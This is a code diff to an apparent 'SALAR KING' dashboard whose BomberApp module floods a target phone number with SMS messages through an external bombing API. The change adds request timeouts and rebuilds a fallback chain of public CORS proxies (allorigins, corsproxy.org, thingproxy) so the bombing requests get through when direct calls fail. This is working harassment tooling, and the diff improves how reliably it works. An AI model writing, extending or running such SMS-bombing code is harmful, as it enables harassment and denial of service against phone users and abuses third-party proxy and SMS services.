@@ -1,7 +1,7 @@
 /* ============================================
    SALAR KING 👑 — Unified Operations Dashboard
    Two independent modules: BomberApp & GatewayApp
-   Fixed CORS proxy fallback chain for SMS Bomber
+   Fixed CORS proxy fallback chain with timeouts
    ============================================ */
 
 (function () {
@@ -105,47 +105,46 @@
             }
         },
 
+        async fetchWithTimeout(url, options = {}, timeout = 15000) {
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), timeout);
+            try {
+                const response = await fetch(url, { ...options, signal: controller.signal });
+                return response;
+            } finally {
+                clearTimeout(timeoutId);
+            }
+        },
+
         async sendBomb(cleanPhone, count) {
             const url = `${this.API_BASE}?phone=${cleanPhone}&count=${count}`;
             const encodedUrl = encodeURIComponent(url);
 
             const proxyChain = [
                 {
-                    name: 'direct',
-                    fetch: () => fetch(url, {
-                        method: 'GET',
-                        headers: { Accept: 'application/json' }
-                    }),
+                    name: 'allorigins-raw',
+                    url: `https://api.allorigins.win/raw?url=${encodedUrl}`,
                     parse: (response) => response.json()
                 },
                 {
-                    name: 'allorigins',
-                    fetch: () => fetch(`https://api.allorigins.win/get?url=${encodedUrl}`, {
-                        method: 'GET',
-                        headers: { Accept: 'application/json' }
-                    }),
+                    name: 'allorigins-wrapped',
+                    url: `https://api.allorigins.win/get?url=${encodedUrl}`,
                     parse: async (response) => {
                         const wrapped = await response.json();
                         if (wrapped && wrapped.contents) {
                             return JSON.parse(wrapped.contents);
                         }
-                        throw new Error('Invalid proxy response format');
+                        throw new Error('Invalid AllOrigins response format');
                     }
                 },
                 {
                     name: 'corsproxy-org',
-                    fetch: () => fetch(`https://corsproxy.org/?${encodedUrl}`, {
-                        method: 'GET',
-                        headers: { Accept: 'application/json' }
-                    }),
+                    url: `https://corsproxy.org/?${encodedUrl}`,
                     parse: (response) => response.json()
                 },
                 {
                     name: 'thingproxy',
-                    fetch: () => fetch(`https://thingproxy.freeboard.io/fetch/${url}`, {
-                        method: 'GET',
-                        headers: { Accept: 'application/json' }
-                    }),
+                    url: `https://thingproxy.freeboard.io/fetch/${url}`,
                     parse: (response) => response.json()
                 }
             ];
@@ -155,7 +154,11 @@
             for (const proxy of proxyChain) {
                 try {
                     console.log(`[Bomber] Trying ${proxy.name}...`);
-                    const response = await proxy.fetch();
+
+                    const response = await this.fetchWithTimeout(proxy.url, {
+                        method: 'GET',
+                        headers: { Accept: 'application/json' }
+                    }, 15000);
 
                     if (!response.ok) {
                         throw new Error(`HTTP ${response.status}`);
